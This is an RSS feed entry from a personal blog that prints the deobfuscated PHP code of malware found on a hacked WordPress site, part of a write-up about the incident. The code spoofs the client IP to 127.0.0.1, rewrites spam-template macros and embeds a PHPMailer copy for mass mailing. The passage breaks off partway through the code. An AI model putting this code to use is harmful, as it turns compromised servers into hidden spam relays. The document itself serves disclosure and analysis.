<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Addendums on Samuel Debruyn</title>
    <link>http://sa.muel.be/addendum/</link>
    <description>Recent content in Addendums on Samuel Debruyn</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <managingEditor>s@muel.be (Samuel Debruyn)</managingEditor>
    <webMaster>s@muel.be (Samuel Debruyn)</webMaster>
    <lastBuildDate>Sat, 27 Jun 2015 18:13:15 +0200</lastBuildDate>
    <atom:link href="http://sa.muel.be/addendum/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Deobfuscated code from the WordPress hack</title>
      <link>http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/</link>
      <pubDate>Sat, 27 Jun 2015 18:13:15 +0200</pubDate>
      <author>s@muel.be (Samuel Debruyn)</author>
      <guid>http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/</guid>
      <description>&lt;p&gt;This page is part of the blogpost &lt;a href=&#34;http://sa.muel.be/2015/about-that-time-i-dealt-with-a-bunch-of-hackers-on-a-wordpress/&#34;&gt;About that time I dealt with a bunch of hackers on a WordPress&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The following is the deobfuscated version of &lt;a href=&#34;http://sa.muel.be/addendum/2015/obfuscated-code-from-the-wordpress-hack/&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
if (isset($_SERVER)) {
    $_SERVER[&#39;PHP_SELF&#39;]    = &amp;quot;/&amp;quot;;
    $_SERVER[&#39;REMOTE_ADDR&#39;] = &amp;quot;127.0.0.1&amp;quot;;
    if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
        $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] = &amp;quot;127.0.0.1&amp;quot;;
    }
}
if (isset($_FILES)) {
    foreach ($_FILES as $key =&amp;gt; $file) {
        if (!strpos($file[&#39;name&#39;], &amp;quot;.jpg&amp;quot;)) {
            $filename             = alter_macros($file[&#39;name&#39;]);
            $filename             = num_macros($filename);
            $filename             = xnum_macros($filename);
            $_FILES[$key][&amp;quot;name&amp;quot;] = $filename;
        }
    }
}
function custom_strip_tags($text)
{
    $text = strip_tags($text, &#39;&amp;lt;a&amp;gt;&#39;);
    $text = str_replace(&amp;quot;&amp;lt;a href=\&amp;quot;&amp;quot;, &amp;quot;[ &amp;quot;, $text);
    $text = str_replace(&amp;quot;&amp;lt;/a&amp;gt;&amp;quot;, &amp;quot;&amp;quot;, $text);
    $text = str_replace(&amp;quot;\&amp;quot;&amp;gt;&amp;quot;, &amp;quot; ] &amp;quot;, $text);

    return $text;
}

function is_ip($str)
{
    return preg_match(&amp;quot;/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/&amp;quot;, $str);
}

function from_host($content)
{

    $host = preg_replace(&#39;/^(www|ftp)\./i&#39;, &#39;&#39;, @$_SERVER[&#39;HTTP_HOST&#39;]);

    if (is_ip($host)) {
        return $content;
    }

    $tokens = explode(&amp;quot;@&amp;quot;, $content);

    $content = $tokens[0] . &amp;quot;@&amp;quot; . $host . &amp;quot;&amp;gt;&amp;quot;;

    return $content;
}

function alter_macros($content)
{
    preg_match_all(&#39;#{(.*)}#Ui&#39;, $content, $matches);

    for ($i = 0; $i &amp;lt; count($matches[1]); $i++) {

        $ns      = explode(&amp;quot;|&amp;quot;, $matches[1][$i]);
        $c2      = count($ns);
        $rand    = rand(0, ($c2 - 1));
        $content = str_replace(&amp;quot;{&amp;quot; . $matches[1][$i] . &amp;quot;}&amp;quot;, $ns[$rand], $content);
    }
    return $content;
}


function xnum_macros($content)
{
    preg_match_all(&#39;#\[NUM\-([[:digit:]]+)\]#&#39;, $content, $matches);

    for ($i = 0; $i &amp;lt; count($matches[0]); $i++) {
        $num = $matches[1][$i];
        $min = pow(10, $num - 1);
        $max = pow(10, $num) - 1;

        $rand    = rand($min, $max);
        $content = str_replace($matches[0][$i], $rand, $content);
    }
    return $content;
}

function num_macros($content)
{
    preg_match_all(&#39;#\[RAND\-([[:digit:]]+)\-([[:digit:]]+)\]#&#39;, $content, $matches);

    for ($i = 0; $i &amp;lt; count($matches[0]); $i++) {
        $min     = $matches[1][$i];
        $max     = $matches[2][$i];
        $rand    = rand($min, $max);
        $content = str_replace($matches[0][$i], $rand, $content);
    }
    return $content;
}


function fteil_macros($content, $fteil)
{
    return str_replace(&amp;quot;[FTEIL]&amp;quot;, $fteil, $content);
}

class PHPMailer
{
    public $Version = &#39;5.2.9&#39;;

    public $Priority = 3;

    public $CharSet = &#39;iso-8859-1&#39;;

    public $ContentType = &#39;text/plain&#39;;

    public $Encoding = &#39;8bit&#39;;

    public $ErrorInfo = &#39;&#39;;

    public $From = &#39;root@localhost&#39;;

    public $FromName = &#39;Root User&#39;;

    public $Sender = &#39;&#39;;

    public $ReturnPath = &#39;&#39;;

    public $Subject = &#39;&#39;;

    public $Body = &#39;&#39;;

    public $AltBody = &#39;&#39;;

    public $Ical = &#39;&#39;;

    protected $MIMEBody = &#39;&#39;;

    protected $MIMEHeader = &#39;&#39;;

    protected $mailHeader = &#39;&#39;;

    public $WordWrap = 0;

    public $Mailer = &#39;mail&#39;;

    public $Sendmail = &#39;/usr/sbin/sendmail&#39;;

    public $UseSendmailOptions = true;

    public $PluginDir = &#39;&#39;;

    public $ConfirmReadingTo = &#39;&#39;;

    public $Hostname = &#39;&#39;;

    public $MessageID = &#39;&#39;;

    public $MessageDate = &#39;&#39;;

    public $Host = &#39;localhost&#39;;

    public $Port = 25;

    public $Helo = &#39;&#39;;

    public $SMTPSecure = &#39;&#39;;

    public $SMTPAuth = false;

    public $Username = &#39;&#39;;

    public $Password = &#39;&#39;;

    public $AuthType = &#39;&#39;;

    public $Realm = &#39;&#39;;

    public $Workstation = &#39;&#39;;

    public $Timeout = 300;

    public $SMTPDebug = 0;

    public $Debugoutput = &#39;echo&#39;;

    public $SMTPKeepAlive = false;

    public $SingleTo = false;

    public $SingleToArray = array();

    public $do_verp = false;

    public $AllowEmpty = false;

    public $LE = &amp;quot;\n&amp;quot;;

    public $DKIM_selector = &#39;&#39;;

    public $DKIM_identity = &#39;&#39;;

    public $DKIM_passphrase = &#39;&#39;;

    public $DKIM_domain = &#39;&#39;;

    public $DKIM_private = &#39;&#39;;

    public $action_function = &#39;&#39;;

    public $XMailer = &#39;&#39;;

    protected $smtp = null;

    protected $to = array();

    protected $cc = array();

    protected $bcc = array();

    protected $ReplyTo = array();

    protected $all_recipients = array();

    protected $attachment = array();

    protected $CustomHeader = array();

    protected $lastMessageID = &#39;&#39;;

    protected $message_type = &#39;&#39;;

    protected $boundary = array();

    protected $language = array();

    protected $error_count = 0;

    protected $sign_cert_file = &#39;&#39;;

    protected $sign_key_file = &#39;&#39;;

    protected $sign_key_pass = &#39;&#39;;

    protected $exceptions = false;

    const STOP_MESSAGE = 0;

    const STOP_CONTINUE = 1;

    const STOP_CRITICAL = 2;

    const CRLF = &amp;quot;\r\n&amp;quot;;

    public function __construct($exceptions = false)
    {
        $this-&amp;gt;exceptions = (boolean) $exceptions;
    }

    public function __destruct()
    {

    }

    private function mailPassthru($to, $subject, $body, $header, $params)
    {
        //Check overloading of mail function to avoid double-encoding
        if (ini_get(&#39;mbstring.func_overload&#39;) &amp;amp; 1) {
            $subject = $this-&amp;gt;secureHeader($subject);
        } else {
            $subject = $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader($subject));
        }
        if (ini_get(&#39;safe_mode&#39;) || !($this-&amp;gt;UseSendmailOptions)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
        return $result;
    }

    protected function edebug($str)
    {
        if ($this-&amp;gt;SMTPDebug &amp;lt;= 0) {
            return;
        }
        //Avoid clash with built-in function names
        if (!in_array($this-&amp;gt;Debugoutput, array(
            &#39;error_log&#39;,
            &#39;html&#39;,
            &#39;echo&#39;
        )) and is_callable($this-&amp;gt;Debugoutput)) {
            call_user_func($this-&amp;gt;Debugoutput, $str, $this-&amp;gt;SMTPDebug);
            return;
        }
        switch ($this-&amp;gt;Debugoutput) {
            case &#39;error_log&#39;:
                //Don&#39;t output, just log
                error_log($str);
                break;
            case &#39;html&#39;:
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(preg_replace(&#39;/[\r\n]+/&#39;, &#39;&#39;, $str), ENT_QUOTES, &#39;UTF-8&#39;) . &amp;quot;&amp;lt;br&amp;gt;\n&amp;quot;;
                break;
            case &#39;echo&#39;:
            default:
                //Normalize line breaks
                $str = preg_replace(&#39;/(\r\n|\r|\n)/ms&#39;, &amp;quot;\n&amp;quot;, $str);
                echo gmdate(&#39;Y-m-d H:i:s&#39;) . &amp;quot;\t&amp;quot; . str_replace(&amp;quot;\n&amp;quot;, &amp;quot;\n                   \t                  &amp;quot;, trim($str)) . &amp;quot;\n&amp;quot;;
        }
    }

    public function isHTML($isHtml = true)
    {
        if ($isHtml) {
            $this-&amp;gt;ContentType = &#39;text/html&#39;;
        } else {
            $this-&amp;gt;ContentType = &#39;text/plain&#39;;
        }
    }

    public function isSMTP()
    {
        $this-&amp;gt;Mailer = &#39;smtp&#39;;
    }

    public function isMail()
    {
        $this-&amp;gt;Mailer = &#39;mail&#39;;
    }

    public function isSendmail()
    {
        $ini_sendmail_path = ini_get(&#39;sendmail_path&#39;);

        if (!stristr($ini_sendmail_path, &#39;sendmail&#39;)) {
            $this-&amp;gt;Sendmail = &#39;/usr/sbin/sendmail&#39;;
        } else {
            $this-&amp;gt;Sendmail = $ini_sendmail_path;
        }
        $this-&amp;gt;Mailer = &#39;sendmail&#39;;
    }

    public function isQmail()
    {
        $ini_sendmail_path = ini_get(&#39;sendmail_path&#39;);

        if (!stristr($ini_sendmail_path, &#39;qmail&#39;)) {
            $this-&amp;gt;Sendmail = &#39;/var/qmail/bin/qmail-inject&#39;;
        } else {
            $this-&amp;gt;Sendmail = $ini_sendmail_path;
        }
        $this-&amp;gt;Mailer = &#39;qmail&#39;;
    }

    public function addAddress($address, $name = &#39;&#39;)
    {
        return $this-&amp;gt;addAnAddress(&#39;to&#39;, $address, $name);
    }

    public function addCC($address, $name = &#39;&#39;)
    {
        return $this-&amp;gt;addAnAddress(&#39;cc&#39;, $address, $name);
    }

    public function addBCC($address, $name = &#39;&#39;)
    {
        return $this-&amp;gt;addAnAddress(&#39;bcc&#39;, $address, $name);
    }

    public function addReplyTo($address, $name = &#39;&#39;)
    {
        return $this-&amp;gt;addAnAddress(&#39;Reply-To&#39;, $address, $name);
    }

    protected function addAnAddress($kind, $address, $name = &#39;&#39;)
    {
        if (!preg_match(&#39;/^(to|cc|bcc|Reply-To)$/&#39;, $kind)) {
            $this-&amp;gt;setError($this-&amp;gt;lang(&#39;Invalid recipient array&#39;) . &#39;: &#39; . $kind);
            $this-&amp;gt;edebug($this-&amp;gt;lang(&#39;Invalid recipient array&#39;) . &#39;: &#39; . $kind);
            if ($this-&amp;gt;exceptions) {
                throw new phpmailerException(&#39;Invalid recipient array: &#39; . $kind);
            }
            return false;
        }
        $address = trim($address);
        $name    = trim(preg_replace(&#39;/[\r\n]+/&#39;, &#39;&#39;, $name)); //Strip breaks and trim
        if (!$this-&amp;gt;validateAddress($address)) {
            $this-&amp;gt;setError($this-&amp;gt;lang(&#39;invalid_address&#39;) . &#39;: &#39; . $address);
            $this-&amp;gt;edebug($this-&amp;gt;lang(&#39;invalid_address&#39;) . &#39;: &#39; . $address);
            if ($this-&amp;gt;exceptions) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;invalid_address&#39;) . &#39;: &#39; . $address);
            }
            return false;
        }
        if ($kind != &#39;Reply-To&#39;) {
            if (!isset($this-&amp;gt;all_recipients[strtolower($address)])) {
                array_push($this-&amp;gt;$kind, array(
                    $address,
                    $name
                ));
                $this-&amp;gt;all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this-&amp;gt;ReplyTo)) {
                $this-&amp;gt;ReplyTo[strtolower($address)] = array(
                    $address,
                    $name
                );
                return true;
            }
        }
        return false;
    }

    public function setFrom($address, $name = &#39;&#39;, $auto = true)
    {
        $address = trim($address);
        $name    = trim(preg_replace(&#39;/[\r\n]+/&#39;, &#39;&#39;, $name)); //Strip breaks and trim
        if (!$this-&amp;gt;validateAddress($address)) {
            $this-&amp;gt;setError($this-&amp;gt;lang(&#39;invalid_address&#39;) . &#39;: &#39; . $address);
            $this-&amp;gt;edebug($this-&amp;gt;lang(&#39;invalid_address&#39;) . &#39;: &#39; . $address);
            if ($this-&amp;gt;exceptions) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;invalid_address&#39;) . &#39;: &#39; . $address);
            }
            return false;
        }
        $this-&amp;gt;From     = $address;
        $this-&amp;gt;FromName = $name;
        if ($auto) {
            if (empty($this-&amp;gt;Sender)) {
                $this-&amp;gt;Sender = $address;
            }
        }
        return true;
    }

    public function getLastMessageID()
    {
        return $this-&amp;gt;lastMessageID;
    }

    public static function validateAddress($address, $patternselect = &#39;auto&#39;)
    {
        if (!$patternselect or $patternselect == &#39;auto&#39;) {
            //Check this constant first so it works when extension_loaded() is disabled by safe mode
            //Constant was added in PHP 5.2.4
            if (defined(&#39;PCRE_VERSION&#39;)) {
                //This pattern can get stuck in a recursive loop in PCRE &amp;lt;= 8.0.2
                if (version_compare(PCRE_VERSION, &#39;8.0.3&#39;) &amp;gt;= 0) {
                    $patternselect = &#39;pcre8&#39;;
                } else {
                    $patternselect = &#39;pcre&#39;;
                }
            } elseif (function_exists(&#39;extension_loaded&#39;) and extension_loaded(&#39;pcre&#39;)) {
                //Fall back to older PCRE
                $patternselect = &#39;pcre&#39;;
            } else {
                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
                if (version_compare(PHP_VERSION, &#39;5.2.0&#39;) &amp;gt;= 0) {
                    $patternselect = &#39;php&#39;;
                } else {
                    $patternselect = &#39;noregex&#39;;
                }
            }
        }
        switch ($patternselect) {
            case &#39;pcre8&#39;:

                return (boolean) preg_match(&#39;/^(?!(?&amp;gt;(?1)&amp;quot;?(?&amp;gt;\\\[ -~]|[^&amp;quot;])&amp;quot;?(?1)){255,})(?!(?&amp;gt;(?1)&amp;quot;?(?&amp;gt;\\\[ -~]|[^&amp;quot;])&amp;quot;?(?1)){65,}@)&#39; . &#39;((?&amp;gt;(?&amp;gt;(?&amp;gt;((?&amp;gt;(?&amp;gt;(?&amp;gt;\x0D\x0A)?[\t ])+|(?&amp;gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&amp;gt;(?2)&#39; . &#39;(?&amp;gt;[\x01-\x08\x0B\x0C\x0E-\&#39;*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)&#39; . &#39;([!#-\&#39;*+\/-9=?^-~-]+|&amp;quot;(?&amp;gt;(?2)(?&amp;gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*&#39; . &#39;(?2)&amp;quot;)(?&amp;gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&amp;gt;([a-z0-9](?&amp;gt;[a-z0-9-]*[a-z0-9])?)&#39; . &#39;(?&amp;gt;(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?&amp;gt;IPv6:(?&amp;gt;([a-f0-9]{1,4})(?&amp;gt;:(?6)){7}&#39; . &#39;|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?&amp;gt;:(?6)){0,6})?::(?7)?))|(?&amp;gt;(?&amp;gt;IPv6:(?&amp;gt;(?6)(?&amp;gt;:(?6)){5}:&#39; . &#39;|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&amp;gt;((?6)(?&amp;gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}&#39; . &#39;|[1-9]?[0-9])(?&amp;gt;\.(?9)){3}))\])(?1)$/isD&#39;, $address);
            case &#39;pcre&#39;:
                //An older regex that doesn&#39;t need a recent PCRE
                return (boolean) preg_match(&#39;/^(?!(?&amp;gt;&amp;quot;?(?&amp;gt;\\\[ -~]|[^&amp;quot;])&amp;quot;?){255,})(?!(?&amp;gt;&amp;quot;?(?&amp;gt;\\\[ -~]|[^&amp;quot;])&amp;quot;?){65,}@)(?&amp;gt;&#39; . &#39;[!#-\&#39;*+\/-9=?^-~-]+|&amp;quot;(?&amp;gt;(?&amp;gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&amp;quot;)&#39; . &#39;(?&amp;gt;\.(?&amp;gt;[!#-\&#39;*+\/-9=?^-~-]+|&amp;quot;(?&amp;gt;(?&amp;gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&amp;quot;))*&#39; . &#39;@(?&amp;gt;(?![a-z0-9-]{64,})(?&amp;gt;[a-z0-9](?&amp;gt;[a-z0-9-]*[a-z0-9])?)(?&amp;gt;\.(?![a-z0-9-]{64,})&#39; . &#39;(?&amp;gt;[a-z0-9](?&amp;gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?&amp;gt;IPv6:(?&amp;gt;(?&amp;gt;[a-f0-9]{1,4})(?&amp;gt;:&#39; . &#39;[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?&amp;gt;[a-f0-9]{1,4}(?&amp;gt;:[a-f0-9]{1,4}){0,6})?&#39; . &#39;::(?&amp;gt;[a-f0-9]{1,4}(?&amp;gt;:[a-f0-9]{1,4}){0,6})?))|(?&amp;gt;(?&amp;gt;IPv6:(?&amp;gt;[a-f0-9]{1,4}(?&amp;gt;:&#39; . &#39;[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&amp;gt;[a-f0-9]{1,4}(?&amp;gt;:[a-f0-9]{1,4}){0,4})?&#39; . &#39;::(?&amp;gt;(?:[a-f0-9]{1,4}(?&amp;gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&amp;gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}&#39; . &#39;|[1-9]?[0-9])(?&amp;gt;\.(?&amp;gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD&#39;, $address);
            case &#39;html5&#39;:
                return (boolean) preg_match(&#39;/^[a-zA-Z0-9.!#$%&amp;amp;\&#39;*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}&#39; . &#39;[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD&#39;, $address);
            case &#39;noregex&#39;:
                return (strlen($address) &amp;gt;= 3 and strpos($address, &#39;@&#39;) &amp;gt;= 1 and strpos($address, &#39;@&#39;) != strlen($address) - 1);
            case &#39;php&#39;:
            default:
                return (boolean) filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }

    public function send()
    {
        try {
            if (!$this-&amp;gt;preSend()) {
                return false;
            }
            return $this-&amp;gt;postSend();
        }
        catch (phpmailerException $exc) {
            $this-&amp;gt;mailHeader = &#39;&#39;;
            $this-&amp;gt;setError($exc-&amp;gt;getMessage());
            if ($this-&amp;gt;exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    public function preSend()
    {
        try {
            $this-&amp;gt;mailHeader = &#39;&#39;;
            if ((count($this-&amp;gt;to) + count($this-&amp;gt;cc) + count($this-&amp;gt;bcc)) &amp;lt; 1) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;provide_address&#39;), self::STOP_CRITICAL);
            }

            // Set whether the message is multipart/alternative
            if (!empty($this-&amp;gt;AltBody)) {
                $this-&amp;gt;ContentType = &#39;multipart/alternative&#39;;
            }

            $this-&amp;gt;error_count = 0; // reset errors
            $this-&amp;gt;setMessageType();
            // Refuse to send an empty message unless we are specifically allowing it
            if (!$this-&amp;gt;AllowEmpty and empty($this-&amp;gt;Body)) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;empty_message&#39;), self::STOP_CRITICAL);
            }

            $this-&amp;gt;MIMEHeader = $this-&amp;gt;createHeader();
            $this-&amp;gt;MIMEBody   = $this-&amp;gt;createBody();

            if ($this-&amp;gt;Mailer == &#39;mail&#39;) {
                if (count($this-&amp;gt;to) &amp;gt; 0) {
                    $this-&amp;gt;mailHeader .= $this-&amp;gt;addrAppend(&#39;To&#39;, $this-&amp;gt;to);
                } else {
                    $this-&amp;gt;mailHeader .= $this-&amp;gt;headerLine(&#39;To&#39;, &#39;undisclosed-recipients:;&#39;);
                }
                $this-&amp;gt;mailHeader .= $this-&amp;gt;headerLine(&#39;Subject&#39;, $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader(trim($this-&amp;gt;Subject))));
            }

            // Sign with DKIM if enabled
            if (!empty($this-&amp;gt;DKIM_domain) &amp;amp;&amp;amp; !empty($this-&amp;gt;DKIM_private) &amp;amp;&amp;amp; !empty($this-&amp;gt;DKIM_selector) &amp;amp;&amp;amp; file_exists($this-&amp;gt;DKIM_private)) {
                $header_dkim      = $this-&amp;gt;DKIM_Add($this-&amp;gt;MIMEHeader . $this-&amp;gt;mailHeader, $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader($this-&amp;gt;Subject)), $this-&amp;gt;MIMEBody);
                $this-&amp;gt;MIMEHeader = rtrim($this-&amp;gt;MIMEHeader, &amp;quot;\r\n &amp;quot;) . self::CRLF . str_replace(&amp;quot;\r\n&amp;quot;, &amp;quot;\n&amp;quot;, $header_dkim) . self::CRLF;
            }
            return true;

        }
        catch (phpmailerException $exc) {
            $this-&amp;gt;setError($exc-&amp;gt;getMessage());
            if ($this-&amp;gt;exceptions) {
                throw $exc;
            }
            return false;
        }
    }

    public function postSend()
    {
        try {
            // Choose the mailer and send through it
            switch ($this-&amp;gt;Mailer) {
                case &#39;sendmail&#39;:
                case &#39;qmail&#39;:
                    return $this-&amp;gt;sendmailSend($this-&amp;gt;MIMEHeader, $this-&amp;gt;MIMEBody);
                case &#39;mail&#39;:
                    return $this-&amp;gt;mailSend($this-&amp;gt;MIMEHeader, $this-&amp;gt;MIMEBody);
                default:
                    $sendMethod = $this-&amp;gt;Mailer . &#39;Send&#39;;
                    if (method_exists($this, $sendMethod)) {
                        return $this-&amp;gt;$sendMethod($this-&amp;gt;MIMEHeader, $this-&amp;gt;MIMEBody);
                    }

                    return $this-&amp;gt;mailSend($this-&amp;gt;MIMEHeader, $this-&amp;gt;MIMEBody);
            }
        }
        catch (phpmailerException $exc) {
            $this-&amp;gt;setError($exc-&amp;gt;getMessage());
            $this-&amp;gt;edebug($exc-&amp;gt;getMessage());
            if ($this-&amp;gt;exceptions) {
                throw $exc;
            }
        }
        return false;
    }

    protected function sendmailSend($header, $body)
    {
        if ($this-&amp;gt;Sender != &#39;&#39;) {
            if ($this-&amp;gt;Mailer == &#39;qmail&#39;) {
                $sendmail = sprintf(&#39;%s -f%s&#39;, escapeshellcmd($this-&amp;gt;Sendmail), escapeshellarg($this-&amp;gt;Sender));
            } else {
                $sendmail = sprintf(&#39;%s -oi -f%s -t&#39;, escapeshellcmd($this-&amp;gt;Sendmail), escapeshellarg($this-&amp;gt;Sender));
            }
        } else {
            if ($this-&amp;gt;Mailer == &#39;qmail&#39;) {
                $sendmail = sprintf(&#39;%s&#39;, escapeshellcmd($this-&amp;gt;Sendmail));
            } else {
                $sendmail = sprintf(&#39;%s -oi -t&#39;, escapeshellcmd($this-&amp;gt;Sendmail));
            }
        }
        if ($this-&amp;gt;SingleTo) {
            foreach ($this-&amp;gt;SingleToArray as $toAddr) {
                if (!@$mail = popen($sendmail, &#39;w&#39;)) {
                    throw new phpmailerException($this-&amp;gt;lang(&#39;execute&#39;) . $this-&amp;gt;Sendmail, self::STOP_CRITICAL);
                }
                fputs($mail, &#39;To: &#39; . $toAddr . &amp;quot;\n&amp;quot;);
                fputs($mail, $header);
                fputs($mail, $body);
                $result = pclose($mail);
                $this-&amp;gt;doCallback(($result == 0), array(
                    $toAddr
                ), $this-&amp;gt;cc, $this-&amp;gt;bcc, $this-&amp;gt;Subject, $body, $this-&amp;gt;From);
                if ($result != 0) {
                    throw new phpmailerException($this-&amp;gt;lang(&#39;execute&#39;) . $this-&amp;gt;Sendmail, self::STOP_CRITICAL);
                }
            }
        } else {
            if (!@$mail = popen($sendmail, &#39;w&#39;)) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;execute&#39;) . $this-&amp;gt;Sendmail, self::STOP_CRITICAL);
            }
            fputs($mail, $header);
            fputs($mail, $body);
            $result = pclose($mail);
            $this-&amp;gt;doCallback(($result == 0), $this-&amp;gt;to, $this-&amp;gt;cc, $this-&amp;gt;bcc, $this-&amp;gt;Subject, $body, $this-&amp;gt;From);
            if ($result != 0) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;execute&#39;) . $this-&amp;gt;Sendmail, self::STOP_CRITICAL);
            }
        }
        return true;
    }

    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this-&amp;gt;to as $toaddr) {
            $toArr[] = $this-&amp;gt;addrFormat($toaddr);
        }
        $to = implode(&#39;, &#39;, $toArr);

        if (empty($this-&amp;gt;Sender)) {
            $params = &#39; &#39;;
        } else {
            $params = sprintf(&#39;-f%s&#39;, $this-&amp;gt;Sender);
        }
        if ($this-&amp;gt;Sender != &#39;&#39; and !ini_get(&#39;safe_mode&#39;)) {
            $old_from = ini_get(&#39;sendmail_from&#39;);
            ini_set(&#39;sendmail_from&#39;, $this-&amp;gt;Sender);
        }
        $result = false;
        if ($this-&amp;gt;SingleTo &amp;amp;&amp;amp; count($toArr) &amp;gt; 1) {
            foreach ($toArr as $toAddr) {
                $result = $this-&amp;gt;mailPassthru($toAddr, $this-&amp;gt;Subject, $body, $header, $params);
                $this-&amp;gt;doCallback($result, array(
                    $toAddr
                ), $this-&amp;gt;cc, $this-&amp;gt;bcc, $this-&amp;gt;Subject, $body, $this-&amp;gt;From);
            }
        } else {
            $result = $this-&amp;gt;mailPassthru($to, $this-&amp;gt;Subject, $body, $header, $params);
            $this-&amp;gt;doCallback($result, $this-&amp;gt;to, $this-&amp;gt;cc, $this-&amp;gt;bcc, $this-&amp;gt;Subject, $body, $this-&amp;gt;From);
        }
        if (isset($old_from)) {
            ini_set(&#39;sendmail_from&#39;, $old_from);
        }
        if (!$result) {
            throw new phpmailerException($this-&amp;gt;lang(&#39;instantiate&#39;), self::STOP_CRITICAL);
        }
        return true;
    }

    public function setLanguage($langcode = &#39;en&#39;, $lang_path = &#39;&#39;)
    {
        // Define full set of translatable strings in English
        $PHPMAILER_LANG = array(
            &#39;authenticate&#39; =&amp;gt; &#39;SMTP Error: Could not authenticate.&#39;,
            &#39;connect_host&#39; =&amp;gt; &#39;SMTP Error: Could not connect to SMTP host.&#39;,
            &#39;data_not_accepted&#39; =&amp;gt; &#39;SMTP Error: data not accepted.&#39;,
            &#39;empty_message&#39; =&amp;gt; &#39;Message body empty&#39;,
            &#39;encoding&#39; =&amp;gt; &#39;Unknown encoding: &#39;,
            &#39;execute&#39; =&amp;gt; &#39;Could not execute: &#39;,
            &#39;file_access&#39; =&amp;gt; &#39;Could not access file: &#39;,
            &#39;file_open&#39; =&amp;gt; &#39;File Error: Could not open file: &#39;,
            &#39;from_failed&#39; =&amp;gt; &#39;The following From address failed: &#39;,
            &#39;instantiate&#39; =&amp;gt; &#39;Could not instantiate mail function.&#39;,
            &#39;invalid_address&#39; =&amp;gt; &#39;Invalid address&#39;,
            &#39;mailer_not_supported&#39; =&amp;gt; &#39; mailer is not supported.&#39;,
            &#39;provide_address&#39; =&amp;gt; &#39;You must provide at least one recipient email address.&#39;,
            &#39;recipients_failed&#39; =&amp;gt; &#39;SMTP Error: The following recipients failed: &#39;,
            &#39;signing&#39; =&amp;gt; &#39;Signing Error: &#39;,
            &#39;smtp_connect_failed&#39; =&amp;gt; &#39;SMTP connect() failed.&#39;,
            &#39;smtp_error&#39; =&amp;gt; &#39;SMTP server error: &#39;,
            &#39;variable_set&#39; =&amp;gt; &#39;Cannot set or reset variable: &#39;
        );
        if (empty($lang_path)) {
            // Calculate an absolute path so it can work if CWD is not here
            $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . &#39;language&#39; . DIRECTORY_SEPARATOR;
        }
        $foundlang = true;
        $lang_file = $lang_path . &#39;phpmailer.lang-&#39; . $langcode . &#39;.php&#39;;
        if ($langcode != &#39;en&#39;) { // There is no English translation file
            // Make sure language file path is readable
            if (!is_readable($lang_file)) {
                $foundlang = false;
            } else {
                $foundlang = include $lang_file;
            }
        }
        $this-&amp;gt;language = $PHPMAILER_LANG;
        return (boolean) $foundlang; // Returns false if language not found
    }

    public function getTranslations()
    {
        return $this-&amp;gt;language;
    }

    public function addrAppend($type, $addr)
    {
        $addresses = array();
        foreach ($addr as $address) {
            $addresses[] = $this-&amp;gt;addrFormat($address);
        }
        return $type . &#39;: &#39; . implode(&#39;, &#39;, $addresses) . $this-&amp;gt;LE;
    }


    public function addrFormat($addr)
    {
        if (empty($addr[1])) { // No name provided
            return $this-&amp;gt;secureHeader($addr[0]);
        } else {
